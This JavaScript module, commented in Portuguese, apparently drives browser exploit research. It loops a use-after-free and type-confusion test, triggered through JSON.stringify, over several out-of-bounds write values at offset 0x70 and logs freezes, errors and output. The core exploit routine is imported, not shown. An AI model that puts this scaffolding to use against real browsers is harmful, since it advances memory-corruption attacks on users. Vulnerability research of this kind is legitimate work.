// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAFSpeculative.mjs';
// OOB_CONFIG é usado por testJsonTypeConfusionUAFSpeculative.mjs
import { toHex } from '../utils.mjs';

async function runUAFTC_VaryingOOBValue_WithExtendedRead() {
    const FNAME_RUNNER = "runUAFTC_VaryingOOBValue";
    logS3(`==== INICIANDO Testes UAF/TC Variando Valor OOB (com Checagem de Leitura Estendida) ====`, 'test', FNAME_RUNNER);

    const valuesToWrite = [
        { desc: "Val_FFFFFFFF", val: 0xFFFFFFFF }, // O valor anterior
        { desc: "Val_00000000", val: 0x00000000 }, // Zero
        { desc: "Val_00000001", val: 0x00000001 }, // Pequeno valor
        { desc: "Val_00010000", val: 0x00010000 }, // Potencialmente um tamanho maior (256KB se interpretado como dword)
        { desc: "Val_7FFFFFFF", val: 0x7FFFFFFF }, // Maior dword positivo
        { desc: "Val_41414141", val: 0x41414141 }, // 'AAAA'
        // Adicione aqui outros valores que suspeita serem relevantes,
        // como Structure IDs conhecidos ou outros ponteiros, se os tiver.
    ];

    const baseTestDescription = "UAFTC_ExtRead_Offset0x70";

    for (const oobValue of valuesToWrite) {
        const testDescription = `${baseTestDescription}_${oobValue.desc}`;
        logS3(`\n--- Executando Teste UAF/TC: ${testDescription} (Valor OOB: ${toHex(oobValue.val)}) ---`, 'subtest', FNAME_RUNNER);

        let result = await executeUAFTypeConfusionTestWithValue(
            testDescription,
            oobValue.val
        );

        if (result.potentiallyFroze) {
            logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else if (result.errorOccurred) {
            logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO ${testDescription}: Completou. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
            logS3(`      Stringify Result (Primeiros 200 chars): ${String(result.stringifyResult).substring(0,200)}`, "info", FNAME_RUNNER);
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
    }

    logS3(`==== Testes UAF/TC Variando Valor OOB CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_VaryOOB_ExtRead';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes UAF/TC Variando Valor OOB com Checagem de Leitura Estendida ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - VaryOOB + ExtRead";

    await runUAFTC_VaryingOOBValue_WithExtendedRead();

    logS3(`\n==== Script 3 CONCLUÍDO (Testes UAF/TC Variando Valor OOB com Checagem de Leitura Estendida) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
